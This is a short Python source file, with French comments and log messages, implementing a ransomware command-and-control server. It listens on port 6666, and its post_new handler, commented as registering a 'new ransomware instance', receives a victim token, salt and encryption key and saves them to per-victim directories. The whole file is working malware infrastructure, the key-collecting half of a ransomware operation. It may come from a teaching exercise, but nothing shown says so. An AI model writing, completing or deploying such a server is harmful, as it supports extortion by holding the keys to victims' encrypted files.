import base64
import os
import logging
from hashlib import sha256
from http.server import HTTPServer

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def __init__(self):
        super().__init__()
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger("CNC")

    def save_b64(self, token: str, data: str, filename: str):
        """Décodage base64 et sauvegarde des données dans un fichier."""
        try:
            bin_data = base64.b64decode(data)
            path = os.path.join(CNC.ROOT_PATH, token, filename)
            
            with open(path, "wb") as f:
                f.write(bin_data)
            
            self.logger.info(f"Fichier enregistré : {path}")

        except Exception as e:
            self.logger.error(f"Erreur lors de l'écriture du fichier {filename}: {e}")

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        # used to register new ransomware instance
        token = body.get("token")
        salt = body.get("salt")
        key = body.get("key")

        if not token or not salt or not key:
            self.logger.warning("Requête invalide : données manquantes")
            return {"status": "Error", "message": "Missing data"}

        try:
            # Hash du token pour éviter d'utiliser des valeurs brutes
            token_path = sha256(token.encode()).hexdigest()

            # Création du répertoire associé à ce token
            dir_path = os.path.join(CNC.ROOT_PATH, token_path)
            os.makedirs(dir_path, exist_ok=True)
            self.logger.info(f"Répertoire créé : {dir_path}")

            # Sauvegarde des clés
            self.save_b64(token_path, salt, "salt.bin")
            self.save_b64(token_path, key, "key.bin")

            return {"status": "Success"}

        except Exception as e:
            self.logger.error(f"Erreur lors de l'enregistrement : {e}")
            return {"status": "Error", "message": str(e)}

# Démarrage du serveur CNC
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
logging.info("Serveur CNC démarré sur le port 6666")
httpd.serve_forever()
